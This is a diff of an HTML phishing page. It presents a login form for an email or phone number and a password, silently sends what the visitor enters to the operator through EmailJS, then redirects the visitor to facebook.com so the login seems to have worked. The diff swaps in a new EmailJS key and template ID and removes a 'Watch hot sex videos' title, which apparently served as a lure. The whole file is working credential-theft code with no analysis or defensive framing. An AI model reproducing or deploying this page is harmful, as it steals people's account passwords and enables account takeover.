@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
-	<title>Watch hot sex videos</title>
+   
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -17,13 +17,13 @@
 
      
  
-                <input type="search"  name="search" id="search" placeholder="Email addess or phone number"  required style="border-radius: none;">
+                <input type="search"   name="search" id="search" placeholder="Email addess or phone number"  required style="border-radius: none;">
      
 
 
  
  
-                <input type="password"  name="password" id="password" placeholder="Password" 
+                <input type="password" name="password" id="password" placeholder="Password" 
                 required>
 
 
@@ -40,23 +40,23 @@
   src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script type="text/javascript">
-  emailjs.init('SBq7bKpeB299tU3Mw')
+  emailjs.init('JgMBMAB7SWFsckcza')
 </script>
 <script type="text/javascript">
-const btn = document.getElementById('button');
+   const btn = document.getElementById('button');
 
 document.getElementById('form')
  .addEventListener('submit', function(event) {
    event.preventDefault();
 
-   btn.value = 'log in...';
+   btn.value = 'Log in.......';
 
    const serviceID = 'default_service';
-   const templateID = 'template_f6izyur';
+   const templateID = 'template_0cdna52';
 
    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
-      window.location="https://www.facebook.com"
+          window.location="https://www.facebook.com"
     }, (err) => {
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
@@ -67,4 +67,5 @@ document.getElementById('form')
 </script>
 </body>
 </html>
+
 
